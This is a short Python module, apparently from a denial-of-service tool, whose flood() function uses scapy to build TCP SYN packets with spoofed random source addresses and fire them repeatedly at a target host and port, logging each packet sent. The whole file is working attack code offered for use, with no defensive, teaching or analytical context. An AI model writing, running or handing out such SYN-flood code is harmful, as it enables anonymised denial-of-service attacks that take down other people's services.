# Import modules
import random
from rich.console import Console
from scapy.all import IP, TCP, send
from bin.addons.utils import random_IP

# Define styled print
print = Console().print
red = "red3"
green = "green1"
yellow = "yellow1"
blue = "dark_slate_gray2"


def flood(target):
    IP_Packet = IP()
    IP_Packet.src = random_IP()
    IP_Packet.dst = target[0]

    TCP_Packet = TCP()
    TCP_Packet.sport = random.randint(1000, 10000)
    TCP_Packet.dport = target[1]
    TCP_Packet.flags = "S"
    TCP_Packet.seq = random.randint(1000, 10000)
    TCP_Packet.window = random.randint(1000, 10000)

    for _ in range(16):
        try:
            send(IP_Packet / TCP_Packet, verbose=False)
        except Exception as e:
            print(
                f"[{red} bold][✘] ERROR[/{red} bold] "
                + f"[{yellow}]while sending SYN packet[/{yellow}]\n{e}"
            )
        else:
            print(
                f"[{green}][✔] SUCCESS[/{green}] "
                + f"[{yellow}]SYN packet sent to[{yellow}] "
                + f"[{blue}]{'{}:{}'.format(*target)}"
            )
